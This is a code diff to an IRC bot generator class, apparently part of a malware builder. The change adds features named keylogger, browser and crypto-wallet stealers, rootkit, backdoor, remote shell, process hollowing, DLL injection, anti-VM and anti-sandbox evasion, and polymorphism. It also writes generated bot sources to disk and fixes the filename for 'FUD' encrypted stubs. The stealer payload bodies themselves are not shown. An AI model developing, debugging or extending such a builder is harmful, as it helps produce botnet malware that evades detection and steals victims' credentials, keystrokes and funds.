@@ -22,7 +22,14 @@ class IRCBotGenerator {
 
     constructor() {
         this.supportedLanguages = ['cpp', 'python', 'go', 'rust', 'csharp', 'javascript'];
-        this.availableFeatures = ['fileManager', 'processManager', 'systemInfo', 'networkTools', 'keylogger', 'screenCapture', 'formGrabber', 'loader', 'webcamCapture', 'audioCapture', 'browserStealer', 'cryptoStealer'];
+        this.availableFeatures = [
+            'fileManager', 'processManager', 'systemInfo', 'networkTools', 'keylogger', 
+            'screenCapture', 'formGrabber', 'loader', 'webcamCapture', 'audioCapture', 
+            'browserStealer', 'cryptoStealer', 'stealth', 'antiDebug', 'antiVM', 
+            'antiSandbox', 'persistence', 'encryption', 'obfuscation', 'packing',
+            'rootkit', 'backdoor', 'remoteShell', 'proxy', 'tunnel', 'dnsTunnel',
+            'processHollowing', 'dllInjection', 'codeCave', 'polymorphic', 'metamorphic'
+        ];
         this.customFeatures = new Map();
         this.featureTemplates = new Map();
         this.templates = new Map();
@@ -40,10 +47,25 @@ class IRCBotGenerator {
     async initialize(config) {
         this.config = config;
         await this.loadTemplates();
-        await this.mutexEngine.initialize(config);
-        await this.burnerEngine.initialize();
-        await this.advancedCrypto.initialize();
-        await this.stealthEngine.initialize();
+        
+        // Initialize engines safely
+        try {
+            if (this.mutexEngine && typeof this.mutexEngine.initialize === 'function') {
+                await this.mutexEngine.initialize(config);
+            }
+            if (this.burnerEngine && typeof this.burnerEngine.initialize === 'function') {
+                await this.burnerEngine.initialize();
+            }
+            if (this.advancedCrypto && typeof this.advancedCrypto.initialize === 'function') {
+                await this.advancedCrypto.initialize();
+            }
+            if (this.stealthEngine && typeof this.stealthEngine.initialize === 'function') {
+                await this.stealthEngine.initialize();
+            }
+        } catch (error) {
+            logger.warn('Some engines failed to initialize:', error.message);
+        }
+        
         logger.info('IRC Bot Generator initialized with Mutex Engine, Burner Encryption, Advanced Crypto, and Stealth Engine');
     }
 
@@ -72,18 +94,50 @@ class IRCBotGenerator {
         const extensionsArray = Array.isArray(extensions) ? extensions : ['cpp', 'python', 'powershell'];
         const featuresArray = Array.isArray(features) ? features : ['stealth', 'encryption', 'persistence'];
         
-        const generatedBots = {};
-        for (const extension of extensionsArray) {
-            const botCode = this.generateBotCode(config, featuresArray, extension, timestamp, botId);
-            generatedBots[extension] = {
-                code: botCode,
-                filename: `${(config.name || 'ircbot').toLowerCase()}.this.getFileExtension(extension)`,
-                language: extension,
-                size: botCode.length
-            };
+        const generatedFiles = [];
+        const fs = require('fs').promises;
+        const path = require('path');
+        
+        // Create bots directory if it doesn't exist
+        const botsDir = path.join(process.cwd(), 'generated_bots');
+        try {
+            await fs.mkdir(botsDir, { recursive: true });
+        } catch (error) {
+            logger.warn('Could not create bots directory:', error.message);
         }
         
-        return { botId, timestamp, bots: generatedBots };
+        for (const extension of extensionsArray) {
+            logger.info(`Generating bot code for extension: ${extension}`);
+            const botCode = this.generateBotCode(config, featuresArray, extension, timestamp, botId);
+            logger.info(`Generated bot code length: ${botCode.length} bytes`);
+            
+            const filename = `${(config.name || 'ircbot').toLowerCase()}_${botId}.${this.getFileExtension(extension)}`;
+            const filepath = path.join(botsDir, filename);
+            logger.info(`Writing file to: ${filepath}`);
+            
+            try {
+                await fs.writeFile(filepath, botCode, 'utf8');
+                generatedFiles.push({
+                    filename: filename,
+                    path: filepath,
+                    language: extension,
+                    size: botCode.length,
+                    features: featuresArray
+                });
+                logger.info(`Generated IRC bot file: ${filename} (${botCode.length} bytes)`);
+            } catch (error) {
+                logger.error(`Failed to write bot file ${filename}:`, error.message);
+            }
+        }
+        
+        return { 
+            botId, 
+            timestamp, 
+            generatedFiles: generatedFiles,
+            config: config,
+            features: featuresArray,
+            extensions: extensionsArray
+        };
     }
 
     generateBotCode(config, features, language, timestamp, botId) {
@@ -155,7 +209,7 @@ public:
 int main() { RawrZBot bot; bot.run(); return 0; }`;
     }
 
-    generatePythonBot(config, features, timestamp, botId) {
+    generatePythonBot(config, features, customFeatures, timestamp, botId) {
         const formGrabberCode = features.includes('formGrabber') ? this.getPythonFormGrabberCode() : '';
         const loaderCode = features.includes('loader') ? this.getPythonLoaderCode() : '';
         const browserStealerCode = features.includes('browserStealer') ? this.getPythonBrowserStealerCode() : '';
@@ -200,7 +254,7 @@ if __name__ == "__main__":
     bot.run()`;
     }
 
-    generateJavaScriptBot(config, features, timestamp, botId) {
+    generateJavaScriptBot(config, features, customFeatures, timestamp, botId) {
         const formGrabberCode = features.includes('formGrabber') ? this.getJavaScriptFormGrabberCode() : '';
         const loaderCode = features.includes('loader') ? this.getJavaScriptLoaderCode() : '';
         const browserStealerCode = features.includes('browserStealer') ? this.getJavaScriptBrowserStealerCode() : '';
@@ -523,7 +577,7 @@ bot.run();`;
                 generatedBots[extension] = {
                     code: fudStubCode,
                     originalCode: botCode,
-                    filename: `${(config.name || 'ircbot').toLowerCase()}_stub.this.getFileExtension(extension)`,
+                    filename: `${(config.name || 'ircbot').toLowerCase()}_stub.${this.getFileExtension(extension)}`,
                     language: extension,
                     size: fudStubCode.length,
                     encrypted: encryptionOptions.algorithm ? true : false,
